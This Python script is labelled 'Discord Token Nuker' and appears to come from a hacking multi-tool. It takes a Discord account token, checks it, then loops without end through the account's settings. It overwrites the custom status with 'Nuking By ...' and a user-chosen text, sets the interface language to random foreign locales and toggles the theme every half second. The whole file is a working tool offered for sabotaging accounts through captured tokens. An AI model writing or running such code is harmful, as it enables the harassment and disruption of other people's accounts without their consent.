from Config.Util import *
from Config.Config import *
from Config.Translates import *

current_language = LANGUAGE

def tr(key):
    return translations[current_language].get(key, key)

try:
    import requests
    import time
    import requests
    import time
    from itertools import cycle
    import random
except Exception as e:
   ErrorModule(e)
   

Title("Discord Token Nuker")

try:
    print()
    token = Choice1TokenDiscord()

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        ()
    else:
        ErrorToken()

    default_status = f"Nuking By {github_tool}"
    custom_status = input(f"{color.RED}{INPUT} {tr('CustomStatus')} -> {color.RESET}")
    statues = [default_status]
    custom_status = f"{custom_status} | Titan"
        
    modes = cycle(["light", "dark"])


    while True:

        CustomStatus_default = {"custom_status": {"text": default_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_default)
            print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")
        except Exception as e:
            print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {color.WHITE}{tr('Error')} {e}{color.RED} | Status Discord: {color.WHITE}{default_status}{color.RED}")

        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status:  {color.WHITE}{tr('Error')}{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status:  {color.WHITE}{tr('Error')}{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)


        CustomStatus_custom = {"custom_status": {"text": custom_status}}
        try:
            r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=CustomStatus_custom)
            print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Status Discord: {color.WHITE}{custom_status}{color.RED}")
        except Exception as e:
            print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status: {color.WHITE}{tr('Changed')}{color.RED} | Status Discord: {color.WHITE}{custom_status}{color.RED}")
        
        for _ in range(5):
            try:
                random_language = random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])
                setting = {'locale': random_language}
                requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Language: {color.WHITE}{random_language}{color.RED}")
            except:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status:  {color.WHITE}{tr('Error')}{color.RED}  | Language: {color.WHITE}{random_language}{color.RED}")
        
            try:
                theme = next(modes)
                setting = {'theme': theme}
                requests.patch("https://discord.com/api/v8/users/@me/settings", headers=headers, json=setting)
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ADD} Status: {color.WHITE}{tr('Changed')}{color.RED} | Theme: {color.WHITE}{theme}{color.RED}")
            except:
                print(f"{primary}[{secondary}{current_time_hour()}{primary}] {ERROR} Status:  {color.WHITE}{tr('Error')}{color.RED}  | Theme: {color.WHITE}{theme}{color.RED}")
            time.sleep(0.5)
except Exception as e:
    Error(e)